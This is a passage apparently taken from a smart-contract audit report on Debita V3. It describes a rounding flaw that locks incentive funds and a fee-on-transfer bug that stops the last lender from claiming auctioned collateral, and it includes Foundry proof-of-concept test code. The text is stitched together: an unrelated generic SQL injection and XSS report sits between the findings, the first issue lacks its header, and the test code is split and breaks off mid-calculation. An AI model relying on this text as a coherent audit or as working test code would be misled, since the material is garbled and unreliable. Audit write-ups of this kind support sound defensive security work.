After each lender calls \u0060DebitaIncentives::claimIncentives()\u0060, there will still be \u00604e17\u0060 locked in the contract permanently. This means the incentivizer loses 0.04% of their incentives and every lender lost \u00604e17 / 6\u0060.  

In \u0060DebitaIncentives.sol\u0060, there is no mechanism for incentivizers to withdraw unclaimed incentives that cannot be claimed due to precision loss.  

1. Incentivizers need to call \u0060DebitaIncentives::incentivizePair()\u0060 to incentivize specific token pairs.  
2. Users need to interact with one of these incentivized pairs by borrowing or lending them.
None.

1. A user that interacted with an incentivized token pair calls \u0060DebitaIncentives::claimIncentives()\u0060. He will receive less funds due to rounding. The funds will be stuck in the contract.

In this example, the incentivizer suffers an approximate loss of 0.04%. This loss could increase as the number of distinct lenders and borrowers interacting with the protocol grows, aligning with the protocol\u0027s objective of fostering increased activity. Users experience a partial loss of their incentive share each time they interact with an incentivized pair within a 14-day period.

It is important to note that incentivizers can incentivize an unlimited number of token pairs for an unlimited number of epochs. Additionally, lenders can participate across multiple epochs.

While the amount of locked funds in this simple scenario is relatively small, similar scenarios could occur repeatedly over an unlimited number of epochs. Over time, this accumulation could result in hundreds of tokens being permanently locked in the contract.

The following should be added in \u0060MultipleLoansDuringIncentives.t.sol\u0060:
\u0060\u0060\u0060solidity
address fourthLender = address(0x04);
address fifthLender = address(0x05);
address sixthLender = address(0x06);
\u0060\u0060\u0060
Add the following test to \u0060MultipleLoansDuringIncentives.t.sol\u0060:
\u0060\u0060\u0060solidity
function testUnclaimableIncentives() public {
    incentivize(AERO, AERO, USDC, true, 1000e18, 2);
    vm.warp(block.timestamp + 15 days);
    createLoan(borrower, firstLender, AERO, AERO);
    createLoan(borrower, secondLender, AERO, AERO);
    createLoan(borrower, thirdLender, AERO, AERO);
    createLoan(borrower, fourthLender, AERO, AERO);
    createLoan(borrower, fifthLender, AERO, AERO);
    createLoan(borrower, sixthLender, AERO, AERO);
    vm.warp(block.timestamp + 30 days);
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// principles, tokenIncentives, epoch with dynamic Data
address[] memory principles = allDynamicData.getDynamicAddressArray(1);
address[] memory tokenUsedIncentive = allDynamicData
   .getDynamicAddressArray(1);
address[][] memory tokenIncentives = new address[][](
   tokenUsedIncentive.length
);
principles[0] = AERO;
tokenUsedIncentive[0] = USDC;
tokenIncentives[0] = tokenUsedIncentive;
vm.startPrank(firstLender);
uint balanceBefore_First = IERC20(USDC).balanceOf(firstLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_First = IERC20(USDC).balanceOf(firstLender);
vm.stopPrank();
vm.startPrank(secondLender);
uint balanceBefore_Second = IERC20(USDC).balanceOf(secondLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_Second = IERC20(USDC).balanceOf(secondLender);
vm.stopPrank();
vm.startPrank(thirdLender);
uint balanceBefore_Third = IERC20(USDC).balanceOf(thirdLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_Third = IERC20(USDC).balanceOf(thirdLender);
vm.stopPrank();
vm.startPrank(fourthLender);
uint balanceBefore_Fourth = IERC20(USDC).balanceOf(fourthLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_Fourth = IERC20(USDC).balanceOf(fourthLender);
vm.stopPrank();
vm.startPrank(fifthLender);
uint balanceBefore_Fifth = IERC20(USDC).balanceOf(fifthLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_Fifth = IERC20(USDC).balanceOf(fifthLender);
vm.stopPrank();
vm.startPrank(sixthLender);
uint balanceBefore_Sixth = IERC20(USDC).balanceOf(sixthLender);
incentivesContract.claimIncentives(principles, tokenIncentives, 2);
uint balanceAfter_Sixth = IERC20(USDC).balanceOf(sixthLender);
vm.stopPrank();
uint claimedFirst = balanceAfter_First - balanceBefore_First;
uint claimedSecond = balanceAfter_Second - balanceBefore_Second;
\u0060\u0060\u0060

Consider adding a mechanism that allows incentivizers to withdraw their unclaimed incentives from all their past incentivized epochs after a specified period following the end of the last incentivized epoch (e.g., two epochs later).


sherlock-admin2

The protocol team fixed this issue in the following PRs/commits:  
https://github.com/DebitaFinance/Debita-V3-Contracts/commit/f9fc693f1fb78447b4

This report outlines the identified vulnerabilities within the system and provides recommendations for remediation.
## Vulnerability Details

### Vulnerability 1: SQL Injection

**Description:**  
An SQL injection vulnerability exists in the user login functionality, allowing attackers to execute arbitrary SQL queries.

**Affected Component:**  
User Authentication Module

**Impact:**  
An attacker can gain unauthorized access to user accounts and sensitive data.

**Recommendation:**  
Use prepared statements and parameterized queries to mitigate this vulnerability.

### Vulnerability 2: Cross-Site Scripting (XSS)

**Description:**  
The application does not properly sanitize user input, leading to potential XSS attacks.

**Affected Component:**  
Comment Section

**Impact:**  
An attacker can inject malicious scripts that execute in the context of other users\u0027 browsers.

**Recommendation:**  
Implement input validation and output encoding to prevent XSS attacks.

## Conclusion

Immediate action is required to address the identified vulnerabilities to ensure the security and integrity of the system.
## Issue M-11: Auctioned taxTokensReceipt NFT Blocks Last Claimant Due to Insufficient Funds

Source: [GitHub Issue #470](https://github.com/sherlock-audit/2024-10-debita-judging/issues/470)  
Found by: 0x37, KaplanLabs, bbl4de, dimulski  


In the \u0060Auction::buyNFT\u0060 function, users can purchase the current NFT in an auction using the same type of tokens as the underlying asset of the NFT. For example, \u0060taxTokensReceipt\u0060 created with FoT tokens must be bought with the same FoT tokens. During the execution of this function, a \u0060transferFrom()\u0060 is performed to transfer funds from the buyer to the auction owner (loan contract). However, it does not account for fees applied during the transfer:

\u0060\u0060\u0060solidity
SafeERC20.safeTransferFrom(
  IERC20(m_currentAuction.sellingToken),
  msg.sender,
  s_ownerOfAuction,
  currentPrice - feeAmount // feeAmount: Fee for the protocol
);
\u0060\u0060\u0060

Later in the function, it calls \u0060DebitaV3Loan::handleAuctionSell\u0060 to distribute the collateral received from the buyer among the parties involved in the loan:

\u0060\u0060\u0060solidity
if (m_currentAuction.isLiquidation) {
  debitaLoan(s_ownerOfAuction).handleAuctionSell(
    currentPrice - feeAmount
  );
}
\u0060\u0060\u0060

The issue arises because the auction contract does not consider the fee on transfer when selling an auctioned \u0060taxTokensReceipt\u0060 NFT. As a result, the final person attempting to claim their share of the collateral on the loan contract will encounter a revert due to insufficient funds.
Not accounting for the fee on transfer when purchasing a tax Tokens Receipt NFT being auctioned.

- Creation a tax Token Receipt NFT with an FoT token.
- Use this tax Token Receipt NFT as collateral in a loan with multiple lenders.
- The loan defaults and the collateral is auctioned.

No response

- FoT Token Fee: 1% fee on every transfer.
## Steps:
1. The borrower creates a tax Tokens Receipt NFT wrapping 10,000 FoT tokens.
2. This NFT is used as collateral in a loan with multiple lenders.
3. At the end of the loan, the borrower defaults and auctions the NFT.
4. During the auction, another user buys the NFT for 7,000 FoT, but due to the FoT token\u0027s transfer fee, the loan contract receives only 6,930 FoT.
5. Inside \u0060handleAuctionSell()\u0060, the system calculates an inflated tokenPerCollateralUsed value (used to split collateral among the remaining claimants) because it doesn\u0027t account for the transfer fee.
6. Impact: When multiple lenders attempt to claim their share of the collateral, the last lender is unable to claim due to insufficient funds in the contract.

The last person attempting to claim the collateral in the loan will be unable to do so.

No response
Take into account the fee on transfer when buying the tax Token Receipt NFT.

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits: [https://github.com/DebitaFinance/Debita-V3-Contracts/commit/7c2bd9e63c95e38f22f3478d36f72c33e8b17117](https://github.com/DebitaFinance/Debita-V3-Contracts/commit/7c2bd9e63c95e38f22f3478d36f72c33e8b17117)
